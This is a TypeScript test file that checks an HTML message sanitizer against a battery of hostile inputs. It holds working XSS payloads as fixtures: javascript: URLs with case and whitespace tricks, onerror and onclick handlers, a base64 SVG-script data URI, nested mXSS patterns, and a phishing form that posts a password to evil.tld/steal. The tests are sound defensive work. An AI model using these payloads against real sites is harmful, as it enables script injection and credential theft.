import {describe, expect, test} from "vitest";

import {sanitizeHtml} from "../src/render.ts";

// Hostile-input battery for the message HTML sanitizer. Each test
// exercises a known payload pattern that has historically slipped past
// lazy allowlists. If any assertion flips, treat the regression as
// high-severity — the Zulip server renders arbitrary user markdown into
// HTML and the sanitizer is the only barrier between a malicious
// sender and the embedder's origin.
function render(html: string): HTMLDivElement {
    const fragment = sanitizeHtml(html, "https://chat.example.com");
    const host = document.createElement("div");
    host.append(fragment);
    return host;
}

describe("sanitizeHtml — hostile inputs", () => {
    test("strips javascript: src on img", () => {
        const host = render(`<img src="javascript:alert(1)">`);
        // Either the img is dropped or its src is stripped; neither
        // leaves an executable payload behind.
        const img = host.querySelector("img");
        if (img) {
            expect(img.getAttribute("src")?.toLowerCase()).not.toContain("javascript:");
        }
    });

    test("strips javascript: in mixed-case and with whitespace", () => {
        // Attackers will try JaVaScRiPt:, with leading whitespace, or
        // with embedded control chars. DOMPurify normalizes case and
        // trims, but we pin it here so any sanitizer swap doesn't
        // regress.
        for (const payload of [
            `<a href="JaVaScRiPt:alert(1)">x</a>`,
            `<a href=" javascript:alert(1)">x</a>`,
            `<a href="java\tscript:alert(1)">x</a>`,
            `<a href="java\nscript:alert(1)">x</a>`,
        ]) {
            const host = render(payload);
            const anchor = host.querySelector("a");
            const href = anchor?.getAttribute("href") ?? "";
            expect(href.toLowerCase()).not.toMatch(/^\s*java\s*script:/);
        }
    });

    test("rewrites protocol-relative anchor hrefs to absolute or drops them", () => {
        // //evil.tld can inherit the host page's protocol (e.g. https
        // on a prod site). If the sanitizer leaves this untouched, the
        // anchor points at an attacker-controlled origin.
        const host = render(`<a href="//evil.tld/x">click</a>`);
        const anchor = host.querySelector("a");
        const href = anchor?.getAttribute("href") ?? "";
        // Either dropped, or normalized to an absolute http(s) URL on
        // our own server origin.
        if (href !== "") {
            expect(href).toMatch(/^https?:\/\//);
        }
    });

    test("onclick/onfocus/onmouseover attributes do not survive", () => {
        const host = render(
            `<span onclick="alert(1)" onfocus="alert(2)" onmouseover="alert(3)">hi</span>`,
        );
        expect(host.innerHTML).not.toMatch(/on(click|focus|mouseover)/i);
    });

    test("style tag contents are dropped", () => {
        // <style> inside a message body could hide the host page UI
        // (display:none on body) or fetch external resources via
        // @import. DOMPurify forbids the tag by default.
        const host = render(`<p>hi</p><style>body{display:none}</style>`);
        expect(host.querySelector("style")).toBeNull();
        expect(host.innerHTML).not.toContain("display:none");
    });

    test("script nested inside pre/code does not execute as script", () => {
        // Zulip fenced code blocks escape < and >, but if a future
        // transport emits raw HTML we need to be sure <script> is
        // stripped even when wrapped in <pre><code>.
        const host = render(
            `<pre><code class="language-html"><script>alert(1)</script></code></pre>`,
        );
        expect(host.querySelector("script")).toBeNull();
    });

    test("iframe/object/embed are stripped", () => {
        const host = render(
            `<iframe src="https://evil.tld"></iframe>` +
                `<object data="https://evil.tld"></object>` +
                `<embed src="https://evil.tld">`,
        );
        expect(host.querySelector("iframe")).toBeNull();
        expect(host.querySelector("object")).toBeNull();
        expect(host.querySelector("embed")).toBeNull();
    });

    test("svg <use href=javascript:> is sanitized", () => {
        // SVG is a known DOMPurify edge-case surface; xlink:href once
        // allowed a javascript: bypass. Pin the current behavior.
        const host = render(
            `<svg><use href="javascript:alert(1)"></use></svg>`,
        );
        const use = host.querySelector("use");
        if (use) {
            const href = use.getAttribute("href") ?? use.getAttribute("xlink:href") ?? "";
            expect(href.toLowerCase()).not.toContain("javascript:");
        }
    });

    test("form/input tags are stripped (could phish)", () => {
        const host = render(
            `<form action="https://evil.tld/steal"><input name="password" type="password"></form>`,
        );
        expect(host.querySelector("form")).toBeNull();
        expect(host.querySelector("input")).toBeNull();
    });

    test("meta refresh is stripped", () => {
        const host = render(
            `<meta http-equiv="refresh" content="0; url=https://evil.tld">hi`,
        );
        expect(host.querySelector("meta")).toBeNull();
    });

    test("anchors with https: href get _blank + noopener+noreferrer", () => {
        // Regression cover: if rel is set to just "noopener" (missing
        // noreferrer) attackers can still read window.opener in some
        // older browsers. The embed's anchor post-processor must add
        // both.
        const host = render(`<a href="https://example.com/x">y</a>`);
        const anchor = host.querySelector("a");
        expect(anchor?.getAttribute("target")).toBe("_blank");
        const rel = anchor?.getAttribute("rel") ?? "";
        expect(rel).toContain("noopener");
        expect(rel).toContain("noreferrer");
    });

    test("data: URIs on img are rejected (server never emits them)", () => {
        // Zulip's server never inlines images as data: — all images
        // come through /user_uploads. A data: img with an SVG payload
        // is a classic XSS vector (SVG can contain <script>), so we
        // refuse them wholesale.
        const host = render(
            `<img src="data:image/svg+xml;base64,PHN2Zz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+">`,
        );
        const img = host.querySelector("img");
        if (img) {
            expect(img.getAttribute("src")?.startsWith("data:")).toBe(false);
        }
    });

    test("deeply nested hostile payload is still neutralized", () => {
        // DOMPurify defends against mutation XSS where nested tags
        // re-parse in an unexpected context. Keep a mXSS-adjacent
        // pattern pinned here so any future config tweak that
        // accidentally enables FORBID_CONTENTS regressions trips.
        const host = render(
            `<p><b><i><svg><img src=x onerror=alert(1)></svg></i></b></p>`,
        );
        expect(host.innerHTML).not.toContain("onerror");
    });
});
